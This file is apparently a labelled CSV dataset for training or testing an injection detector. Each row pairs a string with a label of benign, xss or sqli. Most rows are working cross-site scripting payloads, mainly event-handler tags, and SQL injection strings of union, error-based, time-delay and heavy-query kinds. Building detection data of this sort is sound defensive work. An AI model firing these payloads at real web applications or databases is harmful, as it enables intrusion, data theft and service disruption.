index,payload,type
13727,2.04E+15,benign
20701,"<div id=""43""><?xml version=""1.0"" standalone=""no""?>",xss
20234,"<track onmouseup=""alert(1)"">test</track>",xss
13289,0m24gu1l39,benign
13410,"font d'en canyelles 21, 1-b",benign
3853,"1'   )    )    as usrk where 6324  =  6324 union all select null,null,null,null,null,null,null,null,null,null--",sqli
1659,-9202' where 9799  =  9799 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,sqli
1726,select   (  case when   (  3076  =  3596  )   then 3076 else 3076*  (  select 3076 from mysql.db  )   end  )  #,sqli
15899,"<bgsound draggable=""true"" ondragenter=""alert(1)"">test</bgsound>",xss
15107,7ons15804d04en2e,benign
18448,"<spacer onmousemove=""alert(1)"">test</spacer>",xss
17519,<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>,xss
13291,19665853w,benign
17620,<i id=x tabindex=1 onfocusin=alert(1)></i>,xss
3062,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",sqli
18794,"<style>:target {color:red;}</style><link id=x style=""transition:color 1s"" ontransitionend=alert(1)></link>",xss
620, or ''&',sqli
3409,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',sqli
20278,<u id=x tabindex=1 onfocusin=alert(1)></u>,xss
1256,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",sqli
11816,huyente,benign
16063,<body onpageshow=alert(1)>,xss
3018,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",sqli
1968,"-7313""  )   where 3606  =  3606 union all select 3606#",sqli
13531,5642,benign
14576,l16o2o,benign
12719,reig jallo,benign
11723,16610,benign
18669,"<style>:target {color: red;}</style><noscript id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noscript>",xss
2066,"1 union all select null,null,null,null,null,null,null,null--",sqli
19611,"<summary draggable=""true"" ondragstart=""alert(1)"">test</summary>",xss
2617,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",sqli
48," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",sqli
15909,"<bgsound onbeforecut=""alert(1)"" contenteditable>test</bgsound>",xss
19982,"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",xss
13527,albero bajo,benign
13674,69441548v,benign
3100,"1' in boolean mode  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
2360,"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'rqyz'  =  'rqyz",sqli
3606,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,sqli
12667,6208,benign
14293,25270,benign
12136,dangers9@paremoselalzheimer.az,benign
1210,"1'  )   and elt  (  3528  =  3566,3566  )  ",sqli
3496,"1"" union all select null,null,null,null,null,null,null,null#",sqli
20025,"<tfoot onbeforepaste=""alert(1)"" contenteditable>test</tfoot>",xss
2336,"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr",sqli
19835,<svg><th onload=alert(1)></th>,xss
2836,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",sqli
535," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",sqli
16274,"<code onbeforecut=""alert(1)"" contenteditable>test</code>",xss
13944,8.29E+15,benign
19560,"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationstart=""alert(1)""></tt>",xss
1206,-7505'   )    )    as lqvw where 8565  =  8565 or 6872  =  6872--,sqli
262,select * from information_schema.tables--,sqli
3373,-2429%' or 6890  =  5846,sqli
1043,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",sqli
166,and 1 in   (  select var from temp  )  --,sqli
2344,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""%""  =  """,sqli
11677,indocto,benign
17699,"<image onkeyup=""alert(1)"" contenteditable>test</image>",xss
3546,"1""   )    )    as vigs where 6175  =  6175 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
14862,ga27393,benign
17459,<head id=x tabindex=1 onfocus=alert(1)></head>,xss
17454,"<head draggable=""true"" ondragstart=""alert(1)"">test</head>",xss
20547,"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?",xss
1618,1' in boolean mode  )   union all select null--,sqli
16710,"<div draggable=""true"" contenteditable>drag me</div><big ondrop=alert(1) contenteditable>drop here</big>",xss
19809,<svg><rtc onload=alert(1)></rtc>,xss
12495,35500,benign
18902,"<style>:target {transform: rotate(180deg);}</style><dir id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dir>",xss
2152,"-2377%'   )    )     )   union all select 7706,7706--",sqli
20887,"<div id=""137""><svg>",xss
3702,"1%'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",sqli
12784,van_eyk,benign
11644,16856,benign
13133,halliwil,benign
2973,"1"" where 1719  =  1719 and 7533  =  7533--",sqli
17483,"<header draggable=""true"" ondragend=""alert(1)"">test</header>",xss
15826,"<basefont onmouseenter=""alert(1)"">test</basefont>",xss
14368,verite@culturalsanpedrocf.dm,benign
16819,"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",xss
466,or 'text'   =   n'text',sqli
769," select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",sqli
12239,40355743n,benign
2672,"1""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sqli
19233,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nobr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nobr>",xss
20780,"<x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/>",xss
18999,"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>",xss
18176,"<samp onclick=""alert(1)"">test</samp>",xss
14640,raysa,benign
959,-7562  )   or 8571  =  8571--,sqli
19606,"<sub onpaste=""alert(1)"" contenteditable>test</sub>",xss
13729,4396,benign
18702,"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",xss
11618,kindelan,benign
19580,<sub id=x tabindex=1 onactivate=alert(1)></sub>,xss
14320,limburg@estoespresto.cd,benign
3476,"-8093""   )    )    as oboi where 1476  =  1476 union all select 1476,1476,1476,1476#",sqli
950,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
3287,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",sqli
2485,select   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  select 1123 from information_schema.character_sets  )   end  )  #,sqli
231," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",sqli
12047,ehrenfri,benign
15007,cortegana,benign
18114,"<ruby oncopy=""alert(1)"" contenteditable>test</ruby>",xss
3326,-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sqli
648,PRINT @@variable,sqli
16876,"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",xss
12520,persaud,benign
11483,neugebauer@buscamoto.gw,benign
14771,"garrotxa, 118",benign
488," select * from users where id  =  1. union select null,version  (    )   -- 1",sqli
18013,"<rp onbeforecut=""alert(1)"" contenteditable>test</rp>",xss
1137,1 where 9872  =  9872,sqli
13164,41724359j,benign
3401,"1 where 1153  =  1153 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",sqli
3707,"-8053"" where 5458  =  5458 or 9323  =  9323#",sqli
11885,8110,benign
20157,"<title oncopy=""alert(1)"" contenteditable>test</title>",xss
18144,"<s onclick=""alert(1)"">test</s>",xss
3000,"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
18203,<script id=x tabindex=1 onfocusin=alert(1)></script>,xss
12335,ulldemol bujeque,benign
18017,"<rp oncontextmenu=""alert(1)"">test</rp>",xss
746,"admin""  )   or ""1""  =  ""1""/*",sqli
288,@variable,sqli
12340,c8nde9a,benign
12443,8912,benign
20397,"<video onkeydown=""alert(1)"" contenteditable>test</video>",xss
19571,"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationend=""alert(1)""></xmp>",xss
1860,"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'tmwy'  =  'tmwy",sqli
14518,6egas0a,benign
16640,"<dialog onmouseenter=""alert(1)"">test</dialog>",xss
16830,"<div draggable=""true"" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>",xss
17648,<iframe id=x onfocusin=alert(1)>,xss
1507,"1'||  (  select 'cjwp' where 8681  =  8681 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",sqli
15649,<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>,xss
13470,norton@lesionesmusculares.uz,benign
12249,31049,benign
3724,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
1107, or '1'   =   '1,sqli
3187,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",sqli
20598,<IMG SRC=javascript:alert('XSS')>,xss
15464,"<a onmouseleave=""alert(1)"">test</a>",xss
14135,orzuelo,benign
13350,romer@pisossantcugat.iq,benign
18254,"<section onmouseleave=""alert(1)"">test</section>",xss
19542,"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",xss
2276,"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",sqli
16214,"<center oncontextmenu=""alert(1)"">test</center>",xss
13928,19224,benign
16800,"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",xss
3197,"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'swjk'  =  'swjk",sqli
3592,"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""cxsu"" like ""cxsu",sqli
190," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",sqli
14374,$despumar,benign
19521,"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(1)""></strike>",xss
164," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",sqli
17147,"<embed onmouseleave=""alert(1)"">test</embed>",xss
14539,$ventador,benign
19404,"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationstart=""alert(1)""></hr>",xss
13639,"rua bamio, 190 11?h",benign
3182,"1""  )   where 5814  =  5814 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",sqli
18699,"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strong>",xss
3632,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",sqli
12942,cecil.wolcott7@librodeapuntes.sv,benign
19942,"<td onmouseup=""alert(1)"">test</td>",xss
15002,34475,benign
13242,clica,benign
17972,"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",xss
20316,"<ul oncontextmenu=""alert(1)"">test</ul>",xss
16208,<center id=x tabindex=1 onfocusin=alert(1)></center>,xss
1,""" or pg_sleep  (  __TIME__  )  --",sqli
17033,<dt id=x tabindex=1 ondeactivate=alert(1)></dt><input id=y autofocus>,xss
15069,"calle padre payan 127,",benign
3705,"1' where 6147  =  6147   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",sqli
12254,sienes,benign
17429,"<h1 onbeforecopy=""alert(1)"" contenteditable>test</h1>",xss
1186,1  )   as bhdj where 4472  =  4472,sqli
2953,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
18641,"<style>:target {color: red;}</style><i id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></i>",xss
3132,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sqli
15767,"<b onmouseup=""alert(1)"">test</b>",xss
15308,<svg onload=alert(1)>,xss
18139,<s id=x tabindex=1 onfocusin=alert(1)></s>,xss
13229,descrieres@enibiza.com.ac,benign
3391,"-7255' union all select 2127,2127,2127,2127,2127#",sqli
12733,montoro,benign
18269,<select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>,xss
18347,"<slot onkeypress=""alert(1)"" contenteditable>test</slot>",xss
17292,<footer id=x tabindex=1 onfocus=alert(1)></footer>,xss
12372,reski.kuberskaya@n340magazin.no,benign
14644,cruz,benign
13235,dey,benign
14815,furnari pentinat,benign
11520,burg,benign
15426,"a=alert,a(1)",xss
14784,sureda bahamonde,benign
1050,"1 union all select null,null#",sqli
17079,"<element onkeypress=""alert(1)"" contenteditable>test</element>",xss
412,select * from users where id  =  1 or $<\. or 1  =  1 -- 1,sqli
11377,micaas,benign
16286,"<code onmousedown=""alert(1)"">test</code>",xss
2390,-3026  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,sqli
